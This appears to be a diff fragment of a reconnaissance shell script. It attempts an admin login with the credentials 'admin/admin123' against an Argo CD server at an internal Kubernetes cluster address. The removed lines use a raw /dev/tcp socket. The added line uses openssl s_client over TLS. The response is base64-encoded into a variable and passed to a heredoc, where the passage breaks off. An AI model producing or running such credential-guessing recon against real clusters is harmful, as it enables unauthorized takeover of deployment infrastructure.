@@ -1,12 +1,7 @@
 #!/bin/sh
 RECON=$( (
 bash -c "
-exec 3<>/dev/tcp/argocd-server.argocd.svc.cluster.local/80 2>/dev/null || echo PORT80_FAIL
-if [ \$? -eq 0 ]; then
-  printf \"POST /api/v1/session HTTP/1.0\r\nHost: argocd-server\r\nContent-Type: application/json\r\nContent-Length: 44\r\n\r\n{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"admin123\\\"}\" >&3
-  cat <&3
-  exec 3>&-
-fi
+printf \"POST /api/v1/session HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nContent-Type: application/json\r\nContent-Length: 44\r\nConnection: close\r\n\r\n{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"admin123\\\"}\" | timeout 5 openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -ign_eof 2>/dev/null
 "
 ) | base64 | tr -d '\n' )
 cat << EOF
